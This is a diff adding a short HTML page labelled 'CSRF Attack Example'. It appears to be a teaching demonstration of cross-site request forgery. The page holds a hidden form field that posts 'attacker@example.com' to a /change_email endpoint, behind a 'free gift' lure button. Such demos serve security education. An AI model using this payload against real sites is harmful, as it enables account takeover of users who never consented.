@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <h2>This is a malicious email change form</h2>
+    <p>If you're logged into the target website, clicking the button below will change your email to "attacker@example.com" without your consent!</p>
+    <form action="/change_email" method="POST">
+        <input type="hidden" name="new_email" value="attacker@example.com">
+        <button type="submit">Click here for a free gift!</button>
+    </form>
+</body>
+</html>
